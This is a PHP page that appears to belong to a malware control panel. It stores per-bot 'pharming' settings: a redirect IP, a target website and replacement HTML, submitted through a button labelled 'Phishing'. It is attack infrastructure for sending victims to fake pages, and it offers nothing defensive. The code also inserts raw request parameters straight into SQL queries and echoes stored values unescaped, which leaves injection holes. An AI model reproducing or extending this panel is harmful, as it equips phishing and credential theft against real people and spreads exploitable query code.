<?php
	include("chk.php");
?>
<?php
	if(isset($_POST['pish']))
	{
				include("pinc-nullorder.php");
				include("../config.php");
				saveorder(5);
				$con=mysqli_connect($host,$user,$pass,$db);
					mysqli_query($con,"update bpharming set sip='".$_POST['ip']."' ,sweb='".$_POST['web']."' ,scode='".$_POST['htm']."' where sname='".$_GET['user']."'");
				mysqli_close($con);
	}

		include("../config.php");
					$con=mysql_connect($host,$user,$pass);
					mysql_select_db($db,$con);
					$sel=mysql_query("select * from bpharming where sname='".$_GET['user']."'");
					$row=mysql_fetch_array($sel);				
?>
<form action="" method="post">
<label>IP :</label><label style="font-size:11;">(127.0.0.1)</label>
	<input type="text" class="form-control" style="width:40%" name="ip" value="<?php echo $row['sip'];?>">
<label>WEB :</label><label style="font-size:11;">(site.com)</label>
	<input type="text" class="form-control" style="width:40%" name="web" value="<?php echo $row['sweb'];?>">
<br>
<br>
<label>HTML Code :</label>
	<textarea class="form-control" style="width:100%;height:66%" name="htm"><?php echo $row['scode'];?></textarea>
	<br>
	<br>
		<center><input class="btn btn-primary" type="submit" value="Phishing" name="pish"></center>
</form>